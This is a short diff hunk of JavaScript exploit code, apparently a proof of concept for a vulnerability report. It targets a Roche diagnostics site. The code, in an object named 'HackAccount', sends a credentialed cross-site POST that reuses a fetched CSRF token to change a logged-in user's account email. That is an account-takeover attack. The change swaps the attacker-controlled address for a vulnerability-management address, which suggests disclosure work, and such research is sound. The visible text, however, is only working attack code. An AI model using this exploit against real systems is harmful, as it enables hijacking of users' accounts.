@@ -17,7 +17,7 @@ if(fetchHash.readyState==4 && fetchHash.status==200)
                          url= "https://usdiagnostics.roche.com/my-lab-update-email.html";
                          HackAccount .open("POST",url, true);
                          HackAccount .withCredentials=true;
-                         var data= 'csrfToken='+csrf_token+'&proceedWithNonwhitelist=true&newEmail=may.koh@roche.com&newEmail2=may.koh@roche.com' ;
+                         var data= 'csrfToken='+csrf_token+'&proceedWithNonwhitelist=true&newEmail=vulnerability.management@roche.com&newEmail2=vulnerability.management@roche.com' ;
                          HackAccount .setRequestHeader('X-Requested-With','XMLHttpRequest');
                          HackAccount .setRequestHeader('Content-Type','application/x-www-form-urlencoded');
                          HackAccount .send(data);
